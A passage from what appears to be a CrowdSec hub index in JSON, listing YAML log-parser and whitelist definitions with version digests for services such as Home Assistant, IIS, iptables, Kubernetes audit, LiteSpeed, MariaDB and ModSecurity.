"6f69723dc68203b323f67e4d35490a08564806dcd9a37f50d42cf5f8e04e6143"}, "0.6": {"digest": "57a1868b20758955034ef5005f136535403991f0959a44d5ccbdeb87dab901e2"}, "0.7": {"digest": "8bcca8501879ff7ef1d76c40896d5c68201283b79475aba45fe733c31bafa901"}, "0.8": {"digest": "6b10b448b77e20db219c8b661e8482dbfcd4a9fa5dd73462be2f234e59f64f3d"}}}, "crowdsecurity/home-assistant-logs": {"content": "onsuccess: next_stage\nname: crowdsecurity/home-assistant-logs\ndescription: \"Parse Home Assistant logs\"\nfilter: \"evt.Parsed.program == 'home-assistant' or evt.Parsed.program endsWith 'homeassistant'\"\npattern_syntax:\n  TIMESTAMP: '%{YEAR}-%{MONTHNUM}-%{MONTHDAY} %{HOUR}:%{MINUTE}:%{SECOND}'\nnodes:\n  - grok:\n      pattern: \"%{TIMESTAMP:time} WARNING \\\\(%{DATA:threadName}\\\\) \\\\[homeassistant.components.http.ban\\\\] Login attempt or request with invalid authentication from %{DATA:source_rdns} \\\\(%{IPORHOST:source_ip}\\\\). \\\\(%{GREEDYDATA:http_user_agent}\\\\)\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: home-assistant_failed_auth\n  - grok:\n      pattern: \"%{TIMESTAMP:time} WARNING \\\\(%{DATA:threadName}\\\\) \\\\[homeassistant.components.http.ban\\\\] Login attempt or request with invalid authentication from %{DATA:source_rdns} \\\\(%{IPORHOST:source_ip}\\\\). Requested URL: '%{GREEDYDATA:url}'. \\\\(%{GREEDYDATA:http_user_agent}\\\\)\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: home-assistant_failed_auth\nstatics:\n  - target: StrTime\n    expression: \"evt.Parsed.time\"\n  - meta: service\n    value: http\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - meta: source_rdns\n    expression: \"evt.Parsed.source_rdns\"\n", "description": "Parse Home Assistant logs", "path": "parsers/s01-parse/crowdsecurity/home-assistant-logs.yaml", "stage": "s01-parse", "version": "0.5", "versions": {"0.1": {"digest": "4963cadd8ae936d9104861b383d215a94aed622b1db481a3fe79ea9e7db359bf"}, "0.2": {"digest": "aee629922e77d2bc2f2c1cd5ec3b646dcafe6c6856c8195b4340584c29d23ef2"}, "0.3": {"digest": "7382fc2e6129877aa66f5728d8c93c1007d85e1976d7412140581c97a368d940"}, "0.4": {"digest": "71208b25e33cef30e88cdf0c701b92460c37d8c140be2e769856a8a6292669c5"}, "0.5": {"digest": "8d6c5ea97042f540faac45456240bc277257e1fdb331cc7cc7d9590804ffcb94"}}}, "crowdsecurity/http-logs": {"content": "filter: \"evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']\"\ndescription: \"Parse more Specifically HTTP logs, such as HTTP Code, HTTP path, HTTP args and if its a static ressource\"\nname: crowdsecurity/http-logs\npattern_syntax:\n  DIR: \"^.*/\"\n  FILE: \"[^/].*?\"\n  EXT: \"\\\\.[^.]*$|$\"\nnodes:\n  - statics:\n     - parsed: \"impact_completion\"\n       # the value of a field can as well be determined as the result of an expression\n       expression: \"evt.Meta.http_status in ['404', '403', '502'] ? 'false' : 'true'\"\n     - target: evt.Parsed.static_ressource\n       value: 'false'\n  # let's split the path?query if possible\n  - grok:\n      pattern: \"^%{GREEDYDATA:request}\\\\?%{GREEDYDATA:http_args}$\"\n      apply_on: request\n  # this is another node, with its own pattern_syntax\n  - #debug: true\n    grok:\n      pattern: \"%{DIR:file_dir}(%{FILE:file_frag}%{EXT:file_ext})?\"\n      apply_on: request\n      statics:\n        - meta: http_path\n          expression: \"evt.Parsed.http_path\"\n          # meta af\n        - meta: http_args_len\n          expression: \"len(evt.Parsed.http_args)\"\n        - parsed: file_name\n          expression: evt.Parsed.file_frag + evt.Parsed.file_ext\n        - parsed: static_ressource\n          expression: \"Upper(evt.Parsed.file_ext) in ['.JPG', '.CSS', '.JS', '.JPEG', '.PNG', '.SVG', '.MAP', '.ICO', '.OTF', '.GIF', '.MP3', '.MP4', '.WOFF', '.WOFF2', '.TTF', '.OTF', '.EOT', '.WEBP', '.WAV', '.GZ', '.BROTLI', '.BVR', '.TS', '.BMP', '.AVIF', '.MJS'] ? 'true' : 'false'\"\n", "description": "Parse more Specifically HTTP logs, such as HTTP Code, HTTP path, HTTP args and if its a static ressource", "path": "parsers/s02-enrich/crowdsecurity/http-logs.yaml", "stage": "s02-enrich", "version": "1.3", "versions": {"0.1": {"digest": "d11c01b85927959d1619735c6ac09f260008211edcbf496db0d01b0bd93c5be2"}, "0.2": {"digest": "1274d4a8afd04f96fa0adb03f661ba4a7771cd0be84cf33d1b405881d07c5f0e"}, "0.3": {"digest": "26d3a09d652bd0024ceb1b51a864183367d7391fa33c87db5274c1e47c072999"}, "0.4": {"digest": "ba77a9a5e6b979b9e8d327946aea0a42eed1f035766b80aab2c2a43fb7cf3c13"}, "0.5": {"digest": "132938d05f1af484c29088b588aaa86a329a2e677842e17c255295fb47532990"}, "0.6": {"digest": "57d5b2535d46a2fa6a738917d9e2e64924f5e0090d3c75f2a7c44ad8db36f49c"}, "0.7": {"digest": "c934455276a4ebea1d40f3a80fb960a2f309a06a523b7750c67c374f577f53cf"}, "0.8": {"digest": "7016a32564d1eb6499d8cc9de1591886c6313acb356e513b67da45f9a7386267"}, "0.9": {"digest": "79589c27fe75a013f3ebc4c9f6940c3cd0ee376abcd1f863bfa38e1ca237fc10"}, "1.0": {"digest": "b3e83ce9bfe4cf145fd8d2d03cf68ac696c353e36c825e98f1fa031afaafbae3"}, "1.1": {"digest": "0a1788e43609b451d1a97b009107a1fe242fa21a2926922a6080636b2a2e56d6"}, "1.2": {"digest": "d0a95d6cf41e1ae10d0dd604b6bca9c72ab9e4709950b1816166acd630a18a9e"}, "1.3": {"digest": "ee8348d8d8dc888e186544625accb00c242c44ed50d43823e352abe60103a3d9"}}}, "crowdsecurity/iis-logs": {"content": "filter: \"evt.Parsed.program == 'iis'\"\nonsuccess: next_stage\nname: crowdsecurity/iis-logs\ndescription: \"Parse IIS access logs\"\nnodes:\n  #W3C logs can come from the event log\n  - filter: \"evt.Meta.datasource_type == 'wineventlog' and evt.Parsed.EventID == '6200'\"\n    statics:\n        - meta: source_ip\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='c-ip']\") \n        - meta: http_status\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='sc-status']\")\n        - parsed: http_path\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='cs-uri-stem']\")\n        - meta: http_path\n          expression: evt.Parsed.http_path\n        - target: evt.Parsed.http_args\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='cs-uri-query']\")\n        - parsed: verb\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='cs-method']\")\n        - meta: http_verb\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='cs-method']\")\n        - meta: http_user_agent\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='csUser-Agent']\")\n        - meta: target_fqdn\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='s-sitename']\") #not a FQDN, but close enough ?\n        - target: evt.StrTime\n          expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='date']\") + \" \" + XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='time']\")\n        - target: evt.Parsed.request\n          expression: evt.Meta.http_path + '?' + evt.Parsed.http_args\n  - filter: \"evt.Parsed.datasource_type != 'wineventlog'\"\n    grok:\n      pattern: \"%{TIMESTAMP_ISO8601:date} %{IP:server_ip} %{WORD:http_method} %{DATA:http_path} %{DATA:http_args} %{INT} %{DATA:remote_user} %{IP:client_ip} %{DATA:user_agent} %{DATA:referer} %{INT:status} %{INT:substatus} %{INT:win32_status} %{INT:duration}\"\n      apply_on: message\n    statics:\n      - target: evt.StrTime\n        expression: evt.Parsed.date\n      - meta: source_ip\n        expression: evt.Parsed.client_ip\n      - meta: http_status\n        expression: evt.Parsed.status\n      - meta: http_path\n        expression: evt.Parsed.http_path\n      - meta: http_user_agent\n        expression: evt.Parsed.user_agent\n      - meta: http_verb\n        expression: evt.Parsed.method\n      - parsed: verb\n        expression: evt.Parsed.method\n      - target: evt.Parsed.request\n        expression: evt.Meta.http_path + '?' + evt.Parsed.http_args\n\nstatics:\n  - meta: service\n    value: http\n  - meta: log_type\n    value: http_access-log", "description": "Parse IIS access logs", "path": "parsers/s01-parse/crowdsecurity/iis-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "b7a80af9ef0d2dc28939cde8eb773c578c6526b0d09737ca3b5be1821b1d83b6"}, "0.2": {"digest": "1bf7cff86c0f408a93e661eb8c5ef2959c294a737ffcb800d36c3b03c8358c78"}, "0.3": {"digest": "3f573bae5c2a602dfc51e753bfcde0e51f3d76ebdba9a795c1126b66f2045087"}, "0.4": {"digest": "766ad2b89ad05737339cb9364572f2a48ba629b2f13791e7ee5491f8f7601ff7"}}}, "crowdsecurity/iptables-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'kernel' and evt.Parsed.message contains 'IN=' and not (evt.Parsed.message contains 'ACCEPT')\"\nname: crowdsecurity/iptables-logs\ndescription: \"Parse iptables drop logs\"\nstatics:\n  - parsed: unused #this is never used setting to random var\n    expression: ParseKV(evt.Parsed.message, evt.Unmarshaled, \"iptables\")\n  - meta: service\n    expression: Lower(evt.Unmarshaled.iptables.PROTO)\n  - meta: log_type\n    expression: |\n        evt.Meta.log_type != \"\" ? evt.Meta.log_type : evt.Meta.service in [\"tcp\", \"udp\"] && evt.Unmarshaled.iptables.OUT == \"\" ? \"iptables_drop\" : \"\"\n  - meta: icmp_type\n    expression: evt.Unmarshaled.iptables.TYPE\n  - meta: icmp_code\n    expression: evt.Unmarshaled.iptables.CODE\n  - meta: source_ip\n    expression: \"evt.Unmarshaled.iptables.SRC\"\n## For backporting reason all previous variables will be reparsed out to the parsed object\n  - parsed: dst_port\n    expression: evt.Unmarshaled.iptables.DPT\n  - parsed: int_eth\n    expression: evt.Unmarshaled.iptables.IN\n  - parsed: src_ip\n    expression: evt.Unmarshaled.iptables.SRC\n  - parsed: dst_ip\n    expression: evt.Unmarshaled.iptables.DST\n  - parsed: length\n    expression: evt.Unmarshaled.iptables.LEN\n  - parsed: proto\n    expression: evt.Unmarshaled.iptables.PROTO\n  - parsed: src_port\n    expression: evt.Unmarshaled.iptables.SPT\n", "description": "Parse iptables drop logs", "path": "parsers/s01-parse/crowdsecurity/iptables-logs.yaml", "stage": "s01-parse", "version": "0.6", "versions": {"0.1": {"digest": "00076ea5d8fa862aeb6bb48890d84d9e2763bfc332a635eab884c0a3069fcccd"}, "0.2": {"digest": "5b9e9e5bc1fc9a6ab923a7e08f0c5e4e16e5702f09b5142245694f52c45348f5"}, "0.3": {"digest": "32c82e2b47e825f63e3536bd38bd153019139c8b7f57b8b005aa6d86f88c62f7"}, "0.4": {"digest": "da4ae251f648770b336f709fbae8bcbaae86963cb3d4ff2a6f7545f098c4f65d"}, "0.5": {"digest": "398c9029f54160a021e2a65ce649ed4c9673549321f9b2b72aca9cc548a7706f"}, "0.6": {"digest": "d5e347a14244ff851c8471dd54e4005c6f38b95d7b1b26cf4b86e291eb090c34"}}}, "crowdsecurity/jellyfin-whitelist": {"content": "name: crowdsecurity/jellyfin-whitelist\ndescription: \"Whitelist events from jellyfin\"\nfilter: \"evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']\"\nwhitelist:\n  reason: \"Jellyfin whitelist\"\n  expression:\n   - evt.Meta.http_status == '403' && evt.Meta.http_verb == 'POST' && evt.Meta.http_path matches \"^/Sessions/Playing/Progress$\" # When playing videos\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path matches '(?i)^/items/([a-z0-9\\\\-]+)/images/(thumb|primary)' # When browsing on Roku or Swiftfin clients\n", "description": "Whitelist events from jellyfin", "path": "parsers/s02-enrich/crowdsecurity/jellyfin-whitelist.yaml", "stage": "s02-enrich", "version": "0.3", "versions": {"0.1": {"digest": "aa1cf7cfac48914a41ca95fea4d1aa3b885b27d5359b2ecd39c9a22d21d65c47"}, "0.2": {"digest": "a403cc45906ec71a8c287a642218605fc45a44c0a1afe3d00c96a9aa728409b7"}, "0.3": {"digest": "3eb008399771987f54e86e0ba89aecd5bb7476c00c42b76b0caa1a66ef0ae823"}}}, "crowdsecurity/jellyseerr-whitelist": {"content": "name: crowdsecurity/jellyseerr-whitelist\ndescription: \"Whitelist events from jellyseerr\"\nfilter: \"evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']\"\nwhitelist:\n  reason: \"Jellyseerr whitelist\"\n  expression:\n   - evt.Meta.http_status in ['200', '304'] && evt.Meta.http_verb == 'GET' && evt.Meta.http_path matches '^\\\\/api\\\\/v1\\\\/(movie|tv|request)\\\\/(\\\\d+)$' # When browsing Movies, Series or Requests\n", "description": "Whitelist events from jellyseerr", "path": "parsers/s02-enrich/crowdsecurity/jellyseerr-whitelist.yaml", "stage": "s02-enrich", "version": "0.2", "versions": {"0.1": {"digest": "f312eaddd14758ac0df2d7ce5d171883ae8e1216f0d87d4733ec6294e27193f6"}, "0.2": {"digest": "6fce41cff22bd1685862047dbd78ad87dc9d4f3f469c99d95385a79e4b37beb6"}}}, "crowdsecurity/k8s-audit": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'k8s-audit'\"\nname: crowdsecurity/k8s-audit\ndescription: \"Parse Kubernetes audit logs\"\n#Unfortunately, k8s has slightly different JSON when using a webhook or a file (first letter of the keys is capitalized when using the webhook).\n#Explicitly handle the webhook datasource, and assume file-like format for everything else (it could be coming from the syslog datasource for example)\nnodes:\n  - filter: evt.Meta.datasource_type == \"k8s-audit\"\n    statics:\n    - parsed: k8s_parsed\n      expression: UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, \"k8s_audit\")\n    - meta: user\n      expression: evt.Unmarshaled.k8s_audit.User.username\n    - meta: source_ip\n      expression: evt.Unmarshaled.k8s_audit.SourceIPs[0]\n    - meta: namespace\n      expression: evt.Unmarshaled.k8s_audit.ObjectRef?.Namespace\n    - meta: resource_name\n      expression: evt.Unmarshaled.k8s_audit.ObjectRef?.Name\n    - meta: kind\n      expression: evt.Unmarshaled.k8s_audit.RequestObject?.kind\n    - meta: log_type\n      value: k8s-audit\n    - target: evt.StrTime\n      expression: evt.Unmarshaled.k8s_audit.RequestReceivedTimestamp\n  - filter: evt.Meta.datasource_type != \"k8s-audit\"\n    statics:\n    - parsed: k8s_parsed\n      expression: UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, \"k8s_audit\")\n    - meta: user\n      expression: evt.Unmarshaled.k8s_audit.user.username\n    - meta: source_ip\n      expression: evt.Unmarshaled.k8s_audit.sourceIPs[0]\n    - meta: namespace\n      expression: evt.Unmarshaled.k8s_audit.objectRef?.namespace\n    - meta: resource_name\n      expression: evt.Unmarshaled.k8s_audit.objectRef?.name\n    - meta: kind\n      expression: evt.Unmarshaled.k8s_audit.requestObject?.kind\n    - meta: log_type\n      value: k8s-audit\n    - target: evt.StrTime\n      expression: evt.Unmarshaled.k8s_audit.requestReceivedTimestamp\n", "description": "Parse Kubernetes audit logs", "path": "parsers/s01-parse/crowdsecurity/k8s-audit.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "f6eacd85ee1d51aadda5394edda6a4b0a8672418ee64440926cfab554140ef26"}, "0.2": {"digest": "e76674c085b19f6be7c1c90e15451d3252a38edc0ae554e47446986699031e84"}, "0.3": {"digest": "c5b9c5e3e29019ca67a8e7323b2dea49e77edee4a9c2c8af5c4ca91d2a59395c"}, "0.4": {"digest": "f8e939f05bb591a0770d909440f65bcc1a05e58e96036f06b0fce535aac3af50"}}}, "crowdsecurity/kasm-logs": {"content": "filter: \"evt.Parsed.program startsWith 'kasm'\"\nonsuccess: next_stage\n# debug: true\nname: crowdsecurity/kasm-logs\ndescription: \"Parse kasm logs\"\nnodes:\n  - grok:\n      pattern: '%{IPORHOST:remote_ip}(,%{GREEDYDATA:proxies})?'\n      expression: JsonExtract(evt.Line.Raw, \"request_ip\")\nstatics:\n  - meta: service\n    value: kasm\n  - target: evt.StrTime\n    expression: JsonExtract(evt.Line.Raw, \"timestamp\")\n  - meta: metric_name\n    expression: JsonExtract(evt.Line.Raw, \"metric_name\")\n  - meta: source_ip\n    expression: evt.Parsed.remote_ip\n  - meta: http_user_agent\n    expression: JsonExtract(evt.Line.Raw, \"user_agent\")\n  - meta: http_path\n    expression: JsonExtract(evt.Line.Raw, \"path_info\")", "description": "Parse kasm logs", "path": "parsers/s01-parse/crowdsecurity/kasm-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "cda64d5195d7e0837c64600d2494a5a60f8d8d8967899b730ee32f737a79d9bb"}}}, "crowdsecurity/laurel-logs": {"content": "onsuccess: next_stage\n#debug: true\nname: crowdsecurity/laurel-logs\ndescription: \"Parse laurel json logs\"\n## 1.5.2 returns \"\" , 1.5.3 returns nil\nfilter: evt.Parsed.program == 'laurel'\npattern_syntax:\n  FLOAT: '[0-9\\.]+'\nnodes:\n  - filter: UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, \"laurel\") in [\"\", nil]\n    grok:\n      pattern: '%{FLOAT:timestamp}:%{INT:event_inc_id}'\n      expression: evt.Unmarshaled.laurel.ID\n    nodes:\n      - filter: evt.Unmarshaled.laurel.SYSCALL != nil\n        statics:\n          - meta: service\n            value: laurel\n          - meta: log_type\n            expression: evt.Unmarshaled.laurel.SYSCALL.SYSCALL\n          - target: evt.StrTime\n            expression: evt.Parsed.timestamp\n          - meta: exe\n            expression: evt.Unmarshaled.laurel.SYSCALL.exe\n          - meta: uid\n            expression: int(evt.Unmarshaled.laurel.SYSCALL.uid)\n          - meta: auditd_eventid\n            expression: evt.Parsed.event_inc_id\n          - meta: parent_progname\n            expression: evt.Unmarshaled.laurel.SYSCALL.PPID.exe\n          - meta: ppid\n            expression: int(evt.Unmarshaled.laurel.SYSCALL.ppid)\n          - meta: auid\n            expression: int(evt.Unmarshaled.laurel.SYSCALL.auid)\n          - meta: euid\n            expression: int(evt.Unmarshaled.laurel.SYSCALL.euid)\n          - meta: tty\n            expression: evt.Unmarshaled.laurel.SYSCALL.tty\n          - meta: subj\n            expression: evt.Unmarshaled.laurel.SYSCALL.subj\n          - meta: pid\n            expression: int(evt.Unmarshaled.laurel.SYSCALL.pid)\n          - meta: comm\n            expression: evt.Unmarshaled.laurel.SYSCALL.comm\n          - meta: sig\n            expression: evt.Unmarshaled.laurel.SYSCALL.sig\n          - meta: res\n            expression: evt.Unmarshaled.laurel.SYSCALL.res\n          - meta: str_UID\n            expression: int(evt.Unmarshaled.laurel.SYSCALL.UID)\n          - meta: str_GID\n            expression: int(evt.Unmarshaled.laurel.SYSCALL.GID)\n      - filter: evt.Unmarshaled.laurel.ANOM_ABEND != nil\n        statics:\n          - meta: service\n            value: laurel\n          - meta: log_type\n            value: anom_abend\n          - meta: exe\n            expression: evt.Unmarshaled.laurel.ANOM_ABEND[0].exe\n          - meta: uid\n            expression: int(evt.Unmarshaled.laurel.ANOM_ABEND[0].uid)\n          - meta: auditd_eventid\n            expression: evt.Parsed.event_inc_id\n          - meta: pid\n            expression: int(evt.Unmarshaled.laurel.ANOM_ABEND[0].pid)\n          - meta: auid\n            expression: int(evt.Unmarshaled.laurel.ANOM_ABEND[0].auid)\n          - meta: sig\n            expression: Sprintf(\"%v\", int(evt.Unmarshaled.laurel.ANOM_ABEND[0].sig))\nstatics:\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp", "description": "Parse laurel json logs", "path": "parsers/s01-parse/crowdsecurity/laurel-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "95eab37bd97b342940a3ca7217ee89c6b24b744ddf59e40346a28b43480db60f"}, "0.2": {"digest": "3f8eca354cab4b0aa1b4ab35fbb44c110d6f170f05119dff5d03bfcee8daf124"}}}, "crowdsecurity/litespeed-logs": {"content": "filter: \"evt.Parsed.program == 'litespeed'\"\nonsuccess: next_stage\nname: crowdsecurity/litespeed-logs\ndescription: \"Parse litespeed access and error logs\"\nnodes:\n  - grok:\n      #access log\n      pattern: '%{IPORHOST:remote_addr} - (%{NGUSER:remote_user})? \\[%{HTTPDATE:time_local}\\] \"%{WORD:verb} %{DATA:request} HTTP/%{NUMBER:http_version}\" %{NUMBER:status} %{NUMBER:body_bytes_sent} \"%{NOTDQUOTE:http_referer}\" \"%{NOTDQUOTE:http_user_agent}\"'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: http_access-log\n        - target: evt.StrTime\n          expression: evt.Parsed.time_local\n  - grok:\n      #user not found or bad password for HTTP auth\n      pattern: \"%{TIMESTAMP_ISO8601:time} \\\\[%{DATA:log_level}\\\\] \\\\[%{NONNEGINT:pid}\\\\] \\\\[%{IPORHOST:remote_addr}:%{DATA:misc}#%{DATA:vhost}\\\\] User '%{NGUSER:username}' failed to authenticate\\\\.\"\n      apply_on: message\n      statics:\n        - meta: sub_type\n          value: \"auth_fail\"\n        - meta: username\n          expression: evt.Parsed.username\n        - target: evt.StrTime\n          expression: evt.Parsed.time\n  - grok:\n      #admin UI auth fail\n      pattern: \"%{TIMESTAMP_ISO8601:time} \\\\[%{DATA:log_level}\\\\] \\\\[%{NONNEGINT:pid}\\\\] \\\\[%{IPORHOST:remote_addr}:%{DATA:misc}#%{DATA:vhost}\\\\] \\\\[%{WORD}\\\\] \\\\[%{DATA}\\\\] Failed Login Attempt - username:%{DATA:username} ip:%{IP:client_ip} url:%{DATA:url}\"\n      apply_on: message\n      statics:\n        - meta: sub_type\n          value: \"litespeed_admin_auth_fail\"\n        - target: evt.StrTime\n          expression: evt.Parsed.time\n        - meta: username\n          expression: evt.Parsed.username\nstatics:\n  - meta: service\n    value: http\n  - meta: source_ip\n    expression: \"evt.Parsed.remote_addr\"\n  - meta: http_status\n    expression: \"evt.Parsed.status\"\n  - meta: http_path\n    expression: \"evt.Parsed.request\"\n  - meta: http_verb\n    expression: \"evt.Parsed.verb\"\n  - meta: http_user_agent\n    expression: \"evt.Parsed.http_user_agent\"\n  - meta: target_fqdn\n    expression: \"evt.Parsed.target_fqdn\"\n", "description": "Parse litespeed access and error logs", "path": "parsers/s01-parse/crowdsecurity/litespeed-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "868cf099d57ea7a1994961b8d65e5abce01e797517bb97959c7e68e52dcb0b6f"}}}, "crowdsecurity/magento-extension-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'magento-extension'\"\nname: crowdsecurity/magento-extension-logs\ndescription: \"Parse CrowdSec Magento extension logs\"\npattern_syntax:\n  HEADER: '\\[%{DATA:timestamp}\\] crowdsec-events\\.[^:]+:  %{GREEDYDATA:line} \\[\\]'\nnodes:\n  - grok:\n      name: \"HEADER\"\n      apply_on: message\n      statics:\n        - target: StrTime\n          expression: evt.Parsed.timestamp\nstatics:\n    - meta: service\n      value: magento\n    - meta: log_type\n      expression: JsonExtract(evt.Parsed.line, \"type\")\n    - meta: source_ip\n      expression: JsonExtract(evt.Parsed.line, \"ip\")\n    - meta: x_forwarded_for\n      expression: JsonExtract(evt.Parsed.line, \"x-forwarded-for-ip\")\n    - meta: bouncer_agent\n      expression: JsonExtract(evt.Parsed.line, \"bouncer_agent\")\n    - meta: customer_id\n      expression: JsonExtract(evt.Parsed.line, \"customer_id\")\n    - meta: payment_method\n      expression: JsonExtract(evt.Parsed.line, \"payment_method\")\n    - meta: order_id\n      expression: JsonExtract(evt.Parsed.line, \"order_id\")\n    - meta: product_id\n      expression: JsonExtract(evt.Parsed.line, \"product_id\")\n    - meta: quote_id\n      expression: JsonExtract(evt.Parsed.line, \"quote_id\")", "description": "Parse CrowdSec Magento extension logs", "path": "parsers/s01-parse/crowdsecurity/magento-extension-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "14462ab2a582ecf9be26402de41b9a253e997b93a39c1aa1cfb22abf3740f808"}}}, "crowdsecurity/mariadb-logs": {"content": "onsuccess: next_stage\nname: crowdsecurity/mariadb-logs\ndescription: \"Parse MariaDB logs\"\nfilter: \"evt.Parsed.program startsWith 'mariadb'\"\npattern_syntax:\n  LONG_DATE_YMD: \"%{YEAR:year}-%{MONTHNUM:month}-%{MONTHDAY:day}\"\n  SHORT_DATE_YMD: \"%{YEAR:year}%{MONTHNUM2:month}%{MONTHDAY:day}\"\n  PASSWORD_SYNTAX: \" ?%{TIME:time} (%{NUMBER:thread_id} )?\\\\[Warning\\\\] Access denied for user '%{DATA:user}'@'%{IP:source_ip}' \\\\(using password: %{WORD:using_password}\\\\)\"\nnodes:\n  - grok:\n      pattern: \"%{LONG_DATE_YMD:date} %{PASSWORD_SYNTAX}\"\n      apply_on: message\n    onsuccess: next_stage\n  - grok:\n      pattern: \"%{SHORT_DATE_YMD:date} %{PASSWORD_SYNTAX}\"\n      apply_on: message\n      statics:\n        - target: evt.StrTimeFormat\n          value: \"060102 15:04:05\"\n    onsuccess: next_stage\nstatics:\n  - target: evt.StrTime\n    expression: \"evt.Parsed.date + ' ' + evt.Parsed.time\"\n  - meta: log_type\n    value: \"mariadb_failed_auth\"\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - meta: user\n    expression: \"evt.Parsed.user\"\n", "description": "Parse MariaDB logs", "path": "parsers/s01-parse/crowdsecurity/mariadb-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "98468759d771f3db2dfdf795ac2794c9b56c01d6d46e98a1a81913309bedc74f"}, "0.2": {"digest": "f41ce905ce3bd2034f375af20547930c913260792a82e8426aa8ab3b146cdba0"}, "0.3": {"digest": "de1d309812318018d96a22970c1d3a62e60f4c5807cd845496a09aa72fd18919"}, "0.4": {"digest": "cb1a53a0c8e563401a4c89db5217e73178c6760100c37146b748489823b7778c"}}}, "crowdsecurity/modsecurity": {"content": "onsuccess: next_stage\nfilter: evt.Parsed.program == 'modsecurity'\nname: crowdsecurity/modsecurity\n#debug: true\ndescription: A parser for modsecurity WAF\npattern_syntax:\n  APACHEERRORPREFIX2: \"\\\\[%{APACHEERRORTIME:timestamp}\\\\] \\\\[%{NOTSPACE:apacheseverity}\\\\] (\\\\[pid %{INT}(:tid %{INT})?\\\\] )?\\\\[(client|remote) %{IPORHOST:sourcehost}(:%{INT:source_port})?\\\\] (\\\\[client %{IPORHOST}\\\\])?\"\n  NGINXERRORPREFIX: \"%{NGINXERRTIME:time} \\\\[%{LOGLEVEL:loglevel}\\\\] %{NONNEGINT:pid}#%{NONNEGINT:tid}: (\\\\*%{NONNEGINT:cid} )?(\\\\[client %{IPORHOST}\\\\] )?\"\n  NGINXERRORSUFFIX: \"client: %{IPORHOST:remote_addr}, server: %{DATA:target_fqdn}, request: \\\"%{WORD:verb} %{URIPATHPARAM:request} HTTP/%{NUMBER:http_version}\\\"(, host: \\\"%{IPORHOST}(:%{INT})?\\\")?\"\n  MODSECNGINXPREFIX: \"%{NGINXERRORPREFIX}ModSecurity: (%{NOTSPACE:modsecseverity}\\\\. )?%{GREEDYDATA:modsecmessage}\"\n  MODSECPREFIX2: \"%{APACHEERRORPREFIX2} ModSecurity: (%{NOTSPACE:modsecseverity}\\\\. )?%{GREEDYDATA:modsecmessage}\"\n  MODSECRULEFILE2: \"\\\\[file \\\"%{DATA:rulefile}\\\"\\\\]\"\n  MODSECRULELINE2: \"\\\\[line \\\"%{DATA:ruleline}\\\"\\\\]\"\n  MODSECMATCHOFFSET2: \"\\\\[offset \\\"%{DATA:matchoffset}\\\"\\\\]\"\n  MODSECRULEID2: \"\\\\[id \\\"%{DATA:ruleid}\\\"\\\\]\"\n  MODSECRULEREV2: \"\\\\[rev \\\"%{DATA:rulerev}\\\"\\\\]\"\n  MODSECRULEMSG2: \"\\\\[msg \\\"%{DATA:rulemessage}\\\"\\\\]\"\n  MODSECRULEDATA2: \"\\\\[data \\\"%{DATA:ruledata}\\\"\\\\]\"\n  MODSECRULESEVERITY2: \"\\\\[severity \\\"%{DATA:ruleseverity}\\\"\\\\]\"\n  MODSECRULEMATURITY: \"\\\\[maturity \\\"%{DATA:maturity}\\\"\\\\]\"\n  MODSECRULEACCURACY: \"\\\\[accuracy \\\"%{DATA:accuracy}\\\"\\\\]\"\n  MODSECRULEVERS2: \"\\\\[ver \\\"%{DATA:version}\\\"\\\\]\"\n  MODSECRULETAGS2: \"(?:\\\\[tag \\\"%{DATA:ruletag0}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA:ruletag1}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA:ruletag2}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA:ruletag3}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA:ruletag4}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA:ruletag5}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA:ruletag6}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA:ruletag7}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA:ruletag8}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA:ruletag9}\\\"\\\\] )?(?:\\\\[tag \\\"%{DATA}\\\"\\\\] )*\"\n  